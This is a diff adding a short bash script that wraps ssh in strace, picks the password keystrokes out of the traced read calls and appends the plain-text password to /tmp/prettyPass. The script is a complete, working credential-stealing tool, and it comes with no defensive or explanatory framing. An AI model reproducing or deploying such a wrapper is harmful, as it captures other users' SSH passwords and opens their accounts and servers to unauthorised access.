@@ -1,0 +1,6 @@
+#!/bin/bash
+
+strace -xfo record ssh $@
+grep -o 'read(4, ".", 1)' record | grep -o '"."' > passTrace
+sed 's/\"//g' passTrace | echo The password entered was: `paste -s --delimiters="\0"` >> /tmp/prettyPass
+
